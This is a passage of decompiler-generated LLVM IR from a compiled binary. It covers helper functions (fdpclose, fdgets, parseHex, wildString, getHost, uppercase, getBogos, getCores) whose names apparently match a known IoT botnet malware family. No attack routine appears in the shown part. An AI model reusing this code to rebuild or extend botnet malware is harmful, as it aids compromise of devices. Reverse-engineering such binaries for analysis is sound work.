  %v1_10001b60 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_10001b7c

dec_label_pc_10001b68:                            ; preds = %dec_label_pc_10001b3c
  store i32 268442492, i32* @lr, align 4
  %v1_10001b78 = call i32 @__libc_close(i32 %v3_10001b50)
  br label %dec_label_pc_10001b7c

dec_label_pc_10001b7c:                            ; preds = %dec_label_pc_10001b50, %dec_label_pc_10001b68
  %stack_var_-36.0 = phi i32 [ %v3_10001b50, %dec_label_pc_10001b50 ], [ %tmp3, %dec_label_pc_10001b68 ]
  %v1_10001b80 = mul i32 %stack_var_-36.0, 4
  %v3_10001b8c = load i32, i32* @global_var_1002b918.29, align 4
  %v2_10001b90 = add i32 %v3_10001b8c, %v1_10001b80
  %v2_10001b98 = inttoptr i32 %v2_10001b90 to i32*
  store i32 %v0_10001a34, i32* %v2_10001b98, align 4
  br label %dec_label_pc_10001ba4

dec_label_pc_10001ba4:                            ; preds = %dec_label_pc_10001a68, %dec_label_pc_10001a04, %dec_label_pc_100019cc, %dec_label_pc_10001998, %dec_label_pc_10001974, %dec_label_pc_10001b7c
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_10001a04 ], [ -1, %dec_label_pc_10001a68 ], [ %stack_var_-36.0, %dec_label_pc_10001b7c ], [ -1, %dec_label_pc_100019cc ], [ -1, %dec_label_pc_10001998 ], [ -1, %dec_label_pc_10001974 ]
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-36.0, { 1, 0 }
  uselistorder i32 %v3_10001b50, { 1, 0 }
  uselistorder i32 %v1_100019dc, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @dup2, { 1, 0 }
  uselistorder i8* %arg2, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_10001ba4, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10001b7c, { 1, 0 }
  uselistorder label %dec_label_pc_10001b3c, { 1, 0 }
  uselistorder label %dec_label_pc_10001b0c, { 1, 0 }
  uselistorder label %dec_label_pc_10001b00, { 1, 0 }
  uselistorder label %dec_label_pc_10001ac8, { 1, 0 }
  uselistorder label %dec_label_pc_10001a34, { 1, 0 }
  uselistorder label %dec_label_pc_10001974, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-308 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %v3_10001be0 = load i32, i32* @global_var_1002b918.29, align 4
  %v3_10001be4 = icmp eq i32 %v3_10001be0, 0
  br i1 %v3_10001be4, label %dec_label_pc_10001c10, label %dec_label_pc_10001bec

dec_label_pc_10001bec:                            ; preds = %entry
  %v1_10001bf0 = mul i32 %arg1, 4
  %v2_10001c00 = add i32 %v3_10001be0, %v1_10001bf0
  %v1_10001c04 = inttoptr i32 %v2_10001c00 to i32*
  %v2_10001c04 = load i32, i32* %v1_10001c04, align 4
  %v3_10001c08 = icmp eq i32 %v2_10001c04, 0
  br i1 %v3_10001c08, label %dec_label_pc_10001c10, label %dec_label_pc_10001c1c

dec_label_pc_10001c10:                            ; preds = %dec_label_pc_10001bec, %entry
  br label %dec_label_pc_10001d44

dec_label_pc_10001c1c:                            ; preds = %dec_label_pc_10001bec
  store i32 268442660, i32* @lr, align 4
  %v1_10001c20 = call i32 @__libc_close(i32 %arg1)
  %v2_10001c24 = ptrtoint i32* %stack_var_-180 to i32
  store i32 268442672, i32* @lr, align 4
  %v1_10001c2c = call i32 @sigemptyset(i32 %v2_10001c24)
  store i32 %v2_10001c24, i32* @r3, align 4
  store i32 268442688, i32* @lr, align 4
  %v2_10001c3c = call i32 @__GI_sigaddset(i32 %v2_10001c24, i32 2)
  store i32 %v2_10001c24, i32* @r3, align 4
  store i32 268442704, i32* @lr, align 4
  %v2_10001c4c = call i32 @__GI_sigaddset(i32 %v2_10001c24, i32 3)
  store i32 %v2_10001c24, i32* @r3, align 4
  store i32 268442720, i32* @lr, align 4
  %v2_10001c5c = call i32 @__GI_sigaddset(i32 %v2_10001c24, i32 1)
  %v2_10001c64 = ptrtoint i32* %stack_var_-308 to i32
  store i32 268442744, i32* @lr, align 4
  %v3_10001c74 = call i32 @__GI_sigprocmask(i32 0, i32 %v2_10001c24, i32 %v2_10001c64)
  %v2_10001c94 = ptrtoint i32* %stack_var_-52 to i32
  br label %dec_label_pc_10001c78

dec_label_pc_10001c78:                            ; preds = %dec_label_pc_10001cc0, %dec_label_pc_10001c1c
  %v3_10001c88 = load i32, i32* @global_var_1002b918.29, align 4
  %v2_10001c8c = add i32 %v3_10001c88, %v1_10001bf0
  %v1_10001c90 = inttoptr i32 %v2_10001c8c to i32*
  %v2_10001c90 = load i32, i32* %v1_10001c90, align 4
  store i32 268442792, i32* @lr, align 4
  %v3_10001ca4 = call i32 @__libc_waitpid(i32 %v2_10001c90, i32 %v2_10001c94, i32 0)
  %v4_10001cb8 = icmp eq i32 %v3_10001ca4, -1
  br i1 %v4_10001cb8, label %dec_label_pc_10001cc0, label %dec_label_pc_10001cd4

dec_label_pc_10001cc0:                            ; preds = %dec_label_pc_10001c78
  %v0_10001cc0 = call i32 @__errno_location()
  %v1_10001cc8 = inttoptr i32 %v0_10001cc0 to i32*
  %v2_10001cc8 = load i32, i32* %v1_10001cc8, align 4
  %v3_10001ccc = icmp eq i32 %v2_10001cc8, 4
  br i1 %v3_10001ccc, label %dec_label_pc_10001c78, label %dec_label_pc_10001cd4

dec_label_pc_10001cd4:                            ; preds = %dec_label_pc_10001c78, %dec_label_pc_10001cc0
  %v4_10001cb8.lcssa = phi i1 [ false, %dec_label_pc_10001c78 ], [ true, %dec_label_pc_10001cc0 ]
  store i32 268442856, i32* @lr, align 4
  %v3_10001ce4 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_10001c64, i32 0)
  %v1_10001cec = mul i32 %tmp5, 4
  %v3_10001cf8 = load i32, i32* @global_var_1002b918.29, align 4
  %v2_10001cfc = add i32 %v3_10001cf8, %v1_10001cec
  %v2_10001d04 = inttoptr i32 %v2_10001cfc to i32*
  store i32 0, i32* %v2_10001d04, align 4
  br i1 %v4_10001cb8.lcssa, label %dec_label_pc_10001d3c, label %dec_label_pc_10001d18

dec_label_pc_10001d18:                            ; preds = %dec_label_pc_10001cd4
  %v3_10001d18 = load i32, i32* %stack_var_-52, align 4
  %v1_10001d24 = call i32 @__asm_rlwinm(i32 %v3_10001d18, i32 0, i32 16, i32 23)
  %v4_10001d28 = sdiv i32 %v1_10001d24, 256
  br label %dec_label_pc_10001d3c

dec_label_pc_10001d3c:                            ; preds = %dec_label_pc_10001cd4, %dec_label_pc_10001d18
  %storemerge2 = phi i32 [ %v4_10001d28, %dec_label_pc_10001d18 ], [ -1, %dec_label_pc_10001cd4 ]
  br label %dec_label_pc_10001d44

dec_label_pc_10001d44:                            ; preds = %dec_label_pc_10001c10, %dec_label_pc_10001d3c
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_10001d3c ], [ -1, %dec_label_pc_10001c10 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_10001c24, { 0, 2, 1, 4, 3, 6, 5, 7 }
  uselistorder i32 %v1_10001bf0, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10001d44, { 1, 0 }
  uselistorder label %dec_label_pc_10001d3c, { 1, 0 }
  uselistorder label %dec_label_pc_10001cd4, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  br label %dec_label_pc_10001dd8

dec_label_pc_10001d98:                            ; preds = %dec_label_pc_10001de8
  store i32 268443064, i32* @lr, align 4
  %v1_10001db4 = call i32 @__libc_read(i32 %arg3)
  %v1_10001dc4 = add nuw i32 %storemerge25, 1
  %v3_10001dd0 = icmp eq i32 %v1_10001db4, 1
  br i1 %v3_10001dd0, label %dec_label_pc_10001dd8, label %dec_label_pc_10001e0c

dec_label_pc_10001dd8:                            ; preds = %entry, %dec_label_pc_10001d98
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_10001dc4, %dec_label_pc_10001d98 ]
  %v2_10001de0 = icmp slt i32 %storemerge25, %arg2
  br i1 %v2_10001de0, label %dec_label_pc_10001de8, label %dec_label_pc_10001e0c

dec_label_pc_10001de8:                            ; preds = %dec_label_pc_10001dd8
  %v2_10001df4 = add i32 %storemerge25, %arg1
  %v1_10001df8 = add i32 %v2_10001df4, -1
  %v1_10001dfc = inttoptr i32 %v1_10001df8 to i8*
  %v2_10001dfc = load i8, i8* %v1_10001dfc, align 1
  %v3_10001e04 = icmp eq i8 %v2_10001dfc, 10
  br i1 %v3_10001e04, label %dec_label_pc_10001e0c, label %dec_label_pc_10001d98

dec_label_pc_10001e0c:                            ; preds = %dec_label_pc_10001de8, %dec_label_pc_10001dd8, %dec_label_pc_10001d98
  %stack_var_-36.0.lcssa = phi i32 [ 1, %dec_label_pc_10001de8 ], [ 1, %dec_label_pc_10001dd8 ], [ %v1_10001db4, %dec_label_pc_10001d98 ]
  %v3_10001e10 = icmp eq i32 %stack_var_-36.0.lcssa, 0
  %storemerge = select i1 %v3_10001e10, i32 0, i32 %arg1
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_10001db4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10001dd8, { 1, 0 }
}

define i32 @parseHex(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_10001ea83 = load i8, i8* %arg1, align 1
  %v3_10001eb06 = icmp eq i8 %v2_10001ea83, 0
  br i1 %v3_10001eb06, label %dec_label_pc_10001ec4, label %dec_label_pc_10001eb8

dec_label_pc_10001e68:                            ; preds = %dec_label_pc_10001eb8
  %v1_10001e6c = mul i32 %stack_var_-40.07, 16
  %v2_10001e74 = load i8, i8* %stack_var_-24.08, align 1
  %v3_10001e74 = zext i8 %v2_10001e74 to i32
  %v1_10001e84 = mul nuw nsw i32 %v3_10001e74, 4
  %v2_10001e88 = add i32 %v1_10001e84, ptrtoint (i32* @global_var_10017714.38 to i32)
  %v1_10001e8c = inttoptr i32 %v2_10001e88 to i32*
  %v2_10001e8c = load i32, i32* %v1_10001e8c, align 4
  %v2_10001e90 = or i32 %v2_10001e8c, %v1_10001e6c
  %v1_10001e9c = add i32 %v4_10001ea49, 1
  %v5_10001ea0 = inttoptr i32 %v1_10001e9c to i8*
  %v2_10001ea8 = load i8, i8* %v5_10001ea0, align 1
  %v3_10001eb0 = icmp eq i8 %v2_10001ea8, 0
  br i1 %v3_10001eb0, label %dec_label_pc_10001ec4, label %dec_label_pc_10001eb8

dec_label_pc_10001eb8:                            ; preds = %entry, %dec_label_pc_10001e68
  %v4_10001ea49 = phi i32 [ %v1_10001e9c, %dec_label_pc_10001e68 ], [ %tmp, %entry ]
  %stack_var_-24.08 = phi i8* [ %v5_10001ea0, %dec_label_pc_10001e68 ], [ %arg1, %entry ]
  %stack_var_-40.07 = phi i32 [ %v2_10001e90, %dec_label_pc_10001e68 ], [ 0, %entry ]
  %tmp17 = icmp sgt i32 %stack_var_-40.07, -1
  br i1 %tmp17, label %dec_label_pc_10001e68, label %dec_label_pc_10001ec4

dec_label_pc_10001ec4:                            ; preds = %dec_label_pc_10001e68, %dec_label_pc_10001eb8, %entry
  %stack_var_-40.0.lcssa = phi i32 [ 0, %entry ], [ %v2_10001e90, %dec_label_pc_10001e68 ], [ %stack_var_-40.07, %dec_label_pc_10001eb8 ]
  ret i32 %stack_var_-40.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-40.07, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10001ec4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10001eb8, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp9 = ptrtoint i8* %arg1 to i32
  %v2_10001f00 = load i8, i8* %arg1, align 1
  %v3_10001f10 = icmp eq i8 %v2_10001f00, 42
  br i1 %v3_10001f10, label %dec_label_pc_10001f48, label %dec_label_pc_10001f18

dec_label_pc_10001f18:                            ; preds = %entry
  %v3_10001f1c = icmp eq i8 %v2_10001f00, 63
  br i1 %v3_10001f1c, label %dec_label_pc_10001fbc, label %dec_label_pc_10001f24

dec_label_pc_10001f24:                            ; preds = %dec_label_pc_10001f18
  %v3_10001f28 = icmp eq i8 %v2_10001f00, 0
  br i1 %v3_10001f28, label %dec_label_pc_10001f34, label %dec_label_pc_10002018

dec_label_pc_10001f34:                            ; preds = %dec_label_pc_10001f24
  %v2_10001f38 = load i8, i8* %tmp, align 1
  %v3_10001f38 = zext i8 %v2_10001f38 to i32
  br label %dec_label_pc_1000209c

dec_label_pc_10001f48:                            ; preds = %entry
  %v2_10001f4c = add i32 %tmp9, 1
  store i32 268443484, i32* @lr, align 4
  %v5_10001f58 = inttoptr i32 %v2_10001f4c to i8*
  %v6_10001f58 = call i32 @wildString(i8* %v5_10001f58, i32 %arg2, i32 %tmp9)
  %v3_10001f60 = icmp eq i32 %v6_10001f58, 0
  br i1 %v3_10001f60, label %dec_label_pc_10001fa8, label %dec_label_pc_10001f68

dec_label_pc_10001f68:                            ; preds = %dec_label_pc_10001f48
  %v2_10001f6c = load i8, i8* %tmp, align 1
  %v3_10001f74 = icmp eq i8 %v2_10001f6c, 0
  br i1 %v3_10001f74, label %dec_label_pc_10001fb0, label %dec_label_pc_10001f7c

dec_label_pc_10001f7c:                            ; preds = %dec_label_pc_10001f68
  %v2_10001f80 = add i32 %arg2, 1
  store i32 268443536, i32* @lr, align 4
  %v6_10001f8c = call i32 @wildString(i8* nonnull %arg1, i32 %v2_10001f80, i32 %arg2)
  %v3_10001f94 = icmp eq i32 %v6_10001f8c, 0
  br i1 %v3_10001f94, label %dec_label_pc_10001fa8, label %dec_label_pc_10001fb0

dec_label_pc_10001fa8:                            ; preds = %dec_label_pc_10001f7c, %dec_label_pc_10001f48
  br label %dec_label_pc_10001fb0

dec_label_pc_10001fb0:                            ; preds = %dec_label_pc_10001f68, %dec_label_pc_10001f7c, %dec_label_pc_10001fa8
  %storemerge4 = phi i32 [ 0, %dec_label_pc_10001fa8 ], [ 1, %dec_label_pc_10001f7c ], [ 1, %dec_label_pc_10001f68 ]
  br label %dec_label_pc_1000209c

dec_label_pc_10001fbc:                            ; preds = %dec_label_pc_10001f18
  %v2_10001fc0 = load i8, i8* %tmp, align 1
  %v3_10001fc8 = icmp eq i8 %v2_10001fc0, 0
  br i1 %v3_10001fc8, label %dec_label_pc_1000200c, label %dec_label_pc_10001fd0

dec_label_pc_10001fd0:                            ; preds = %dec_label_pc_10001fbc
  %v1_10001fd4 = add i32 %tmp9, 1
  %v2_10001fdc = add i32 %arg2, 1
  store i32 268443628, i32* @lr, align 4
  %v4_10001fe8 = inttoptr i32 %v1_10001fd4 to i8*
  %v5_10001fe8 = call i32 @wildString(i8* %v4_10001fe8, i32 %v2_10001fdc, i32 %arg2)
  %v3_10001ff0 = icmp ne i32 %v5_10001fe8, 0
  %. = zext i1 %v3_10001ff0 to i32
  br label %dec_label_pc_1000200c

dec_label_pc_1000200c:                            ; preds = %dec_label_pc_10001fd0, %dec_label_pc_10001fbc
  %storemerge3 = phi i32 [ 1, %dec_label_pc_10001fbc ], [ %., %dec_label_pc_10001fd0 ]
  br label %dec_label_pc_1000209c

dec_label_pc_10002018:                            ; preds = %dec_label_pc_10001f24
  %v3_1000201c = load i8, i8* %arg1, align 1
  %v4_1000201c = zext i8 %v3_1000201c to i32
  store i32 268443696, i32* @lr, align 4
  %v3_1000202c = call i32 @__GI_toupper(i32 %v4_1000201c, i32 %tmp9)
  %v3_10002038 = load i8, i8* %tmp, align 1
  %v4_10002038 = zext i8 %v3_10002038 to i32
  store i32 268443724, i32* @lr, align 4
  %v3_10002048 = call i32 @__GI_toupper(i32 %v4_10002038, i32 %arg2)
  %v4_10002050 = icmp eq i32 %v3_1000202c, %v3_10002048
  br i1 %v4_10002050, label %dec_label_pc_10002058, label %dec_label_pc_10002094

dec_label_pc_10002058:                            ; preds = %dec_label_pc_10002018
  %v1_1000205c = add i32 %tmp9, 1
  %v2_10002064 = add i32 %arg2, 1
  store i32 268443764, i32* @lr, align 4
  %v4_10002070 = inttoptr i32 %v1_1000205c to i8*
  %v5_10002070 = call i32 @wildString(i8* %v4_10002070, i32 %v2_10002064, i32 %arg2)
  %v3_10002078 = icmp ne i32 %v5_10002070, 0
  %.8 = zext i1 %v3_10002078 to i32
  br label %dec_label_pc_10002094

dec_label_pc_10002094:                            ; preds = %dec_label_pc_10002058, %dec_label_pc_10002018
  %storemerge = phi i32 [ 1, %dec_label_pc_10002018 ], [ %.8, %dec_label_pc_10002058 ]
  br label %dec_label_pc_1000209c

dec_label_pc_1000209c:                            ; preds = %dec_label_pc_1000200c, %dec_label_pc_10001fb0, %dec_label_pc_10001f34, %dec_label_pc_10002094
  %stack_var_-36.0 = phi i32 [ %storemerge4, %dec_label_pc_10001fb0 ], [ %storemerge3, %dec_label_pc_1000200c ], [ %v3_10001f38, %dec_label_pc_10001f34 ], [ %storemerge, %dec_label_pc_10002094 ]
  ret i32 %stack_var_-36.0

; uselistorder directives
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 5, 6, 7, 3, 4, 0, 1, 2, 8 }
  uselistorder label %dec_label_pc_1000209c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10001fb0, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 268443880, i32* @lr, align 4
  %v1_100020e4 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_100020e4, i32* %arg2, align 4
  %v4_10002100 = icmp eq i32 %v1_100020e4, -1
  %. = zext i1 %v4_10002100 to i32
  ret i32 %.
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_100021902 = load i8, i8* %arg1, align 1
  %v3_100021985 = icmp eq i8 %v2_100021902, 0
  br i1 %v3_100021985, label %dec_label_pc_100021a0, label %dec_label_pc_10002158

dec_label_pc_10002158:                            ; preds = %entry, %dec_label_pc_10002158
  %storemerge7 = phi i8* [ %storemerge, %dec_label_pc_10002158 ], [ %arg1, %entry ]
  %storemerge.in6 = phi i32 [ %v1_10002184, %dec_label_pc_10002158 ], [ %tmp, %entry ]
  %v3_1000215c = load i8, i8* %storemerge7, align 1
  %v4_1000215c = zext i8 %v3_1000215c to i32
  store i32 %v4_1000215c, i32* %r3.global-to-local, align 4
  store i32 268444016, i32* @lr, align 4
  %v3_1000216c = call i32 @__GI_toupper(i32 %v4_1000215c, i32 %storemerge.in6)
  store i32 %v3_1000216c, i32* %r3.global-to-local, align 4
  %v1_1000217c = trunc i32 %v3_1000216c to i8
  store i8 %v1_1000217c, i8* %storemerge7, align 1
  %v1_10002184 = add i32 %storemerge.in6, 1
  %storemerge = inttoptr i32 %v1_10002184 to i8*
  %v2_10002190 = load i8, i8* %storemerge, align 1
  %v3_10002198 = icmp eq i8 %v2_10002190, 0
  br i1 %v3_10002198, label %dec_label_pc_1000218c.dec_label_pc_100021a0_crit_edge, label %dec_label_pc_10002158

dec_label_pc_1000218c.dec_label_pc_100021a0_crit_edge: ; preds = %dec_label_pc_10002158
  %v0_100021b4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100021a0

dec_label_pc_100021a0:                            ; preds = %dec_label_pc_1000218c.dec_label_pc_100021a0_crit_edge, %entry
  %v0_100021b4 = phi i32 [ %v0_100021b4.pre, %dec_label_pc_1000218c.dec_label_pc_100021a0_crit_edge ], [ %tmp, %entry ]
  ret i32 %v0_100021b4

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 0 }
  uselistorder i32 %v1_10002184, { 1, 0 }
  uselistorder i32 %storemerge.in6, { 1, 0 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10002158, { 1, 0 }
}

define i32 @getBogos(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4120 = alloca i32, align 4
  %stack_var_-4128 = alloca i32, align 4
  store i32 268444132, i32* @lr, align 4
  %v3_100021e0 = call i32 @__libc_open(i32 ptrtoint ([14 x i8]* @global_var_10017b14.39 to i32), i32 0)
  %v2_10002380 = ptrtoint i32* %stack_var_-4128 to i32
  %v1_100021f8 = bitcast i32* %stack_var_-4128 to i8*
  br label %dec_label_pc_10002380

dec_label_pc_100021f0:                            ; preds = %dec_label_pc_10002380
  store i32 268444156, i32* @lr, align 4
  %v2_100021f8 = call i32 @uppercase(i8* %v1_100021f8)
  store i32 268444176, i32* @lr, align 4
  %v5_1000220c = call i32 @strstr(i32 %v2_10002380, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017b24.40, i32 0, i32 0), i32 268500992)
  %v4_1000221c = icmp eq i32 %v5_1000220c, %v2_10002380
  br i1 %v4_1000221c, label %dec_label_pc_10002224, label %dec_label_pc_10002368

dec_label_pc_10002224:                            ; preds = %dec_label_pc_100021f0
  %tmp15 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_10002240

dec_label_pc_10002234:                            ; preds = %dec_label_pc_10002268, %dec_label_pc_10002254, %dec_label_pc_10002240
  %v1_10002238 = add i32 %v4_10002240, 1
  %v5_1000223c = inttoptr i32 %v1_10002238 to i8*
  br label %dec_label_pc_10002240

dec_label_pc_10002240:                            ; preds = %dec_label_pc_10002224, %dec_label_pc_10002234
  %storemerge2 = phi i8* [ %v5_1000223c, %dec_label_pc_10002234 ], [ %tmp15, %dec_label_pc_10002224 ]
  %v4_10002240 = ptrtoint i8* %storemerge2 to i32
  %v2_10002244 = load i8, i8* %storemerge2, align 1
  %v3_1000224c = icmp eq i8 %v2_10002244, 32
  br i1 %v3_1000224c, label %dec_label_pc_10002234, label %dec_label_pc_10002254

dec_label_pc_10002254:                            ; preds = %dec_label_pc_10002240
  %v2_10002258 = load i8, i8* %storemerge2, align 1
  %v3_10002260 = icmp eq i8 %v2_10002258, 9
  br i1 %v3_10002260, label %dec_label_pc_10002234, label %dec_label_pc_10002268

dec_label_pc_10002268:                            ; preds = %dec_label_pc_10002254
  %v2_1000226c = load i8, i8* %storemerge2, align 1
  %v3_10002274 = icmp eq i8 %v2_1000226c, 58
  br i1 %v3_10002274, label %dec_label_pc_10002234, label %dec_label_pc_100022a8.preheader

dec_label_pc_100022a8.preheader:                  ; preds = %dec_label_pc_10002268
  %v2_100022c0 = add i32 %v4_10002240, -1
  br label %dec_label_pc_100022a8

dec_label_pc_10002280:                            ; preds = %dec_label_pc_100022d8, %dec_label_pc_100022a8
  store i32 %v4_10002240, i32* @r3, align 4
  %v0_10002288 = call i32 @__GI_strlen()
  %v1_1000229c = add i32 %v0_10002288, %v2_100022c0
  %v3_100022a4 = inttoptr i32 %v1_1000229c to i8*
  store i8 0, i8* %v3_100022a4, align 1
  br label %dec_label_pc_100022a8

dec_label_pc_100022a8:                            ; preds = %dec_label_pc_100022a8.preheader, %dec_label_pc_10002280
  store i32 %v4_10002240, i32* @r3, align 4
  %v0_100022b0 = call i32 @__GI_strlen()
  %v1_100022c4 = add i32 %v0_100022b0, %v2_100022c0
  %v1_100022c8 = inttoptr i32 %v1_100022c4 to i8*
  %v2_100022c8 = load i8, i8* %v1_100022c8, align 1
  %v3_100022d0 = icmp eq i8 %v2_100022c8, 13
  br i1 %v3_100022d0, label %dec_label_pc_10002280, label %dec_label_pc_100022d8

dec_label_pc_100022d8:                            ; preds = %dec_label_pc_100022a8
  store i32 %v4_10002240, i32* @r3, align 4
  %v0_100022e0 = call i32 @__GI_strlen()
  %v1_100022f4 = add i32 %v0_100022e0, %v2_100022c0
  %v1_100022f8 = inttoptr i32 %v1_100022f4 to i8*
  %v2_100022f8 = load i8, i8* %v1_100022f8, align 1
  %v3_10002300 = icmp eq i8 %v2_100022f8, 10
  br i1 %v3_10002300, label %dec_label_pc_10002280, label %dec_label_pc_10002308

dec_label_pc_10002308:                            ; preds = %dec_label_pc_100022d8
  store i32 %v4_10002240, i32* @r3, align 4
  store i32 268444440, i32* @lr, align 4
  %v2_10002314 = call i32 @__GI_strchr(i32 %v4_10002240, i32 46)
  %v3_1000231c = icmp eq i32 %v2_10002314, 0
  br i1 %v3_1000231c, label %dec_label_pc_10002340, label %dec_label_pc_10002324

dec_label_pc_10002324:                            ; preds = %dec_label_pc_10002308
  store i32 %v4_10002240, i32* @r3, align 4
  store i32 268444468, i32* @lr, align 4
  %v2_10002330 = call i32 @__GI_strchr(i32 %v4_10002240, i32 46)
  %v3_1000233c = inttoptr i32 %v2_10002330 to i8*
  store i8 0, i8* %v3_1000233c, align 1
  br label %dec_label_pc_10002340

dec_label_pc_10002340:                            ; preds = %dec_label_pc_10002308, %dec_label_pc_10002324
  %v3_10002350 = call i32 @strcpy(i32 %arg1, i8* %storemerge2)
  store i32 ptrtoint (i32* @global_var_1000235c.41 to i32), i32* @lr, align 4
  %v1_10002358 = call i32 @__libc_close(i32 %v3_100021e0)
  br label %dec_label_pc_100023b0

dec_label_pc_10002368:                            ; preds = %dec_label_pc_100021f0
  store i32 268444544, i32* @lr, align 4
  %v3_1000237c = call i32 @__GI_memset(i32 %v2_10002380, i32 0, i32 4096)
  br label %dec_label_pc_10002380

dec_label_pc_10002380:                            ; preds = %entry, %dec_label_pc_10002368
  %v3_10002390 = call i32 @fdgets(i32 %v2_10002380, i32 4096, i32 %v3_100021e0)
  %v3_10002398 = icmp eq i32 %v3_10002390, 0
  br i1 %v3_10002398, label %dec_label_pc_100023a0, label %dec_label_pc_100021f0

dec_label_pc_100023a0:                            ; preds = %dec_label_pc_10002380
  store i32 ptrtoint (i32* @global_var_100023a8.42 to i32), i32* @lr, align 4
  %v1_100023a4 = call i32 @__libc_close(i32 %v3_100021e0)
  br label %dec_label_pc_100023b0

dec_label_pc_100023b0:                            ; preds = %dec_label_pc_10002340, %dec_label_pc_100023a0
  %storemerge = phi i32 [ 1, %dec_label_pc_100023a0 ], [ 0, %dec_label_pc_10002340 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_10002240, { 1, 0, 3, 2, 4, 7, 5, 6, 8 }
  uselistorder i8* %storemerge2, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_10002380, { 3, 0, 1, 2 }
  uselistorder i32 %v3_100021e0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100023b0, { 1, 0 }
  uselistorder label %dec_label_pc_10002380, { 1, 0 }
  uselistorder label %dec_label_pc_10002340, { 1, 0 }
  uselistorder label %dec_label_pc_100022a8, { 1, 0 }
  uselistorder label %dec_label_pc_10002240, { 1, 0 }
}

define i32 @getCores() local_unnamed_addr {
entry:
  %stack_var_-4112 = alloca i32, align 4
  store i32 268444672, i32* @lr, align 4
  %v3_100023fc = call i32 @__libc_open(i32 ptrtoint ([14 x i8]* @global_var_10017b14.39 to i32), i32 0)
  %v2_10002460 = ptrtoint i32* %stack_var_-4112 to i32
  %v1_10002414 = bitcast i32* %stack_var_-4112 to i8*
  br label %dec_label_pc_10002460

dec_label_pc_1000240c:                            ; preds = %dec_label_pc_10002460
  store i32 268444696, i32* @lr, align 4
  %v2_10002414 = call i32 @uppercase(i8* %v1_10002414)
  store i32 268444716, i32* @lr, align 4
  %v5_10002428 = call i32 @strstr(i32 %v2_10002460, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017b24.40, i32 0, i32 0), i32 268500992)
  %v4_10002434 = icmp eq i32 %v5_10002428, %v2_10002460
  br i1 %v4_10002434, label %dec_label_pc_1000243c, label %dec_label_pc_10002448

dec_label_pc_1000243c:                            ; preds = %dec_label_pc_1000240c
  %v1_10002440 = add i32 %stack_var_-4116.1, 1
  br label %dec_label_pc_10002448

dec_label_pc_10002448:                            ; preds = %dec_label_pc_1000240c, %dec_label_pc_1000243c
  %stack_var_-4116.0 = phi i32 [ %v1_10002440, %dec_label_pc_1000243c ], [ %stack_var_-4116.1, %dec_label_pc_1000240c ]
  store i32 268444768, i32* @lr, align 4
  %v3_1000245c = call i32 @__GI_memset(i32 %v2_10002460, i32 0, i32 4096)
  br label %dec_label_pc_10002460

dec_label_pc_10002460:                            ; preds = %entry, %dec_label_pc_10002448
  %stack_var_-4116.1 = phi i32 [ 0, %entry ], [ %stack_var_-4116.0, %dec_label_pc_10002448 ]
  %v3_10002470 = call i32 @fdgets(i32 %v2_10002460, i32 4096, i32 %v3_100023fc)
  %v3_10002478 = icmp eq i32 %v3_10002470, 0
  br i1 %v3_10002478, label %dec_label_pc_10002480, label %dec_label_pc_1000240c

dec_label_pc_10002480:                            ; preds = %dec_label_pc_10002460
  store i32 268444808, i32* @lr, align 4
  %v1_10002484 = call i32 @__libc_close(i32 %v3_100023fc)
  ret i32 %stack_var_-4116.1

; uselistorder directives
  uselistorder i32 %stack_var_-4116.1, { 0, 2, 1 }
  uselistorder i32 %v2_10002460, { 3, 0, 1, 2 }
  uselistorder i32 (i8*)* @uppercase, { 1, 0 }
  uselistorder label %dec_label_pc_10002460, { 1, 0 }
